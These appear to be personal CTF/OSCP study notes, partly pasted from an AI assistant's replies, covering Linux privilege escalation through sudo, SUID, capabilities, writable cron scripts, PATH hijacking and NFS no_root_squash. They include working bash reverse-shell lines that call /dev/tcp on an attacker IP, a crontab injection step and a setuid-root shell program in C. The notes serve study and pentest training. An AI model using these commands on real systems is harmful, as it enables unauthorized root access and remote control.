# Sudo
# SUID
# Capabilities






Absolutely! Here's a clean, beginner-friendly summary you can add to your **Obsidian** notes. It's short, clear, and covers the three common Linux privilege escalation methods:

---

## 🔐 Linux Privilege Escalation Summary

### 1. **SUDO** (SuperUser DO)

* If a user can run commands with `sudo`, they may be able to escalate to root.
* Check what you can run with:

  ```
  sudo -l
  ```
* Example: If a user can run `sudo vim`, they can launch a root shell from inside vim.

---

### 2. **SUID** (Set User ID)

* Files with the **SUID** bit run with the file owner's privileges (often root), **no matter who runs it**.
* Find SUID files:

  ```
  find / -perm -4000 -type f 2>/dev/null
  ```
* Exploit example: If `/usr/bin/python` has SUID set, you can use it to get a root shell.

---

### 3. **Capabilities**

* More fine-tuned than SUID: give specific privileges to a binary **without full root access**.
* Check for capabilities:

  ```
  getcap -r / 2>/dev/null
  ```
* Some tools (like `vim` or `python`) can still be used for escalation if they have dangerous capabilities set.
* Refer to [GTFOBins](https://gtfobins.github.io) for known tricks using capabilities.

---



---

## 🛠️ Linux Privilege Escalation: Cron Jobs & PATH Manipulation

---

### 🧩 1. Cron Jobs Enumeration

**Goal:** Find cron jobs run by root or others where you can inject or replace commands.

#### 🔍 Basic Commands:

```bash
# Check current user's cron jobs
crontab -l

# Check for system-wide cron jobs
ls -al /etc/cron*
cat /etc/crontab
cat /etc/anacrontab
ls -l /etc/cron.d/

# Check timers on systems using systemd
systemctl list-timers --all
```

---

### 🎯 2. Find Writable Cron Scripts

Check if any scripts or files executed by cron are **writable**:

```bash
# Look for scripts referenced in crontab
grep -r 'bin/' /etc/cron*

# Search for writable files executed by cron
find /etc/cron* /var/spool/cron -type f -writable -exec ls -l {} \;
```

✅ **Exploit Tip:**  
If you find a script owned by root but writable by your user:

```bash
echo "bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1" >> /path/to/script
# Or just replace the whole file with your reverse shell
```

---

### 🛣️ 3. PATH Variable Manipulation

**Goal:** Exploit poor use of absolute paths in cron jobs or scripts.

#### 🔍 Step-by-Step:

1. **Find a script run by root** (via cron or suid) that calls a binary without full path:
    

Example:

```bash
#!/bin/bash
backup.sh  # ← vulnerable if called without full path
```

2. **Check if that binary name (e.g., `backup.sh`) is not in a secure path:**
    

```bash
strings /path/to/script | grep -E '\.sh|cp|mv|tar|gzip'
```

3. **Create a fake malicious binary with the same name:**
    

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1' > /tmp/fakecp
chmod +x /tmp/fakecp
```

4. **Manipulate PATH:**
    

```bash
export PATH=/tmp:$PATH
```

Or if it's a cron job, place your fake binary in a **directory that appears earlier in PATH**.

---

### ⚠️ Important Checks

```bash
# Check for writeable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I {} find {} -type d -writable 2>/dev/null

# Check current user PATH
echo $PATH
```

✅ If `/usr/local/bin`, `/home/user/bin`, or `/tmp` is writable and appears _before_ `/bin` or `/usr/bin`, you can hijack commands like `cp`, `tar`, `gzip`.

---

### 📖 Real-World Example

```bash
# Crontab shows:
*/1 * * * * root /opt/scripts/clean.sh

# Contents of clean.sh:
#!/bin/bash
tar -czf /backup/backup.tgz /home/user/

# But it doesn’t use absolute path to `tar` 🔥

# You do:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
```

When cron runs, it executes your `/tmp/tar` instead of `/bin/tar`.

---

### 🧪 Crontab Injection (If You Can Write to `/etc/crontab` or `/etc/cron.d`)

```bash
echo "* * * * * root /tmp/rootme.sh" >> /etc/crontab
echo '#!/bin/bash\nid >> /tmp/proof.txt' > /tmp/rootme.sh
chmod +x /tmp/rootme.sh
```

---



Here's your revised and concise **Obsidian-friendly note**, combining your detailed explanation with clean structure and markdown formatting, perfect for fast reference during CTFs or reviews:

---

## 🚀 NFS Privilege Escalation (no\_root\_squash)

**Category:** Remote → Local Privesc
**Vector:** Misconfigured NFS Share (`no_root_squash`)
**Relevance:** CTFs, OSCP, real-world pentests (e.g. backup systems)

---

### 🧠 Concept

Privilege escalation vectors are not limited to local enumeration. Shared services like **NFS**, **SSH**, or **Telnet** can offer root access remotely — especially when combined. For example:

* Finding a root SSH private key and logging in as root.
* Or mounting a misconfigured NFS share with root permissions.

---

### 📁 NFS Basics

* NFS configuration is stored in: `/etc/exports`
* Default behavior: **root is squashed** (mapped to `nfsnobody`)
* If `no_root_squash` is set **and** the share is writable:

  * Files created as root retain root privileges
  * You can upload a **SUID-root binary**

---

### ⚙️ Exploitation Steps

1. **Mount the NFS share** from attacker machine:

   ```bash
   sudo mount -t nfs -o rw 10.10.x.x:/exported/path /mnt/nfs
   ```

2. **Create a SUID binary** on the mounted share:

   ```c
   // nfs.c
   #include <stdio.h>
   #include <stdlib.h>
   int main() {
     setuid(0); setgid(0);
     system("/bin/bash");
     return 0;
   }
   ```

3. **Compile & set SUID**:

   ```bash
   gcc nfs.c -o nfs
   chmod +s nfs
   ```

4. **Switch to target system** and run:

   ```bash
   ./nfs
   whoami  # should return root
   ```

---

### 🛡️ Defense

* Always use `root_squash` unless explicitly required.
* Never export writable shares with `no_root_squash`.
* Restrict NFS to trusted IP ranges and use firewall rules.

---

### 🧪 Notes

* This works **because SUID bits are preserved** in `no_root_squash` shares.
* The target executes your binary **as root**, since the file ownership is maintained.

---

Let me know if you want to add a code block for automatic detection or enumeration tools (e.g., `showmount`, `nmap`, etc).



### 📎 References

- [GTFOBins – Cron](https://gtfobins.github.io/gtfobins/cron/)
    
- [HackTricks – Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
    
- TryHackMe rooms: _Linux PrivEsc, Sudo Security, Cron Jobs_
    

---

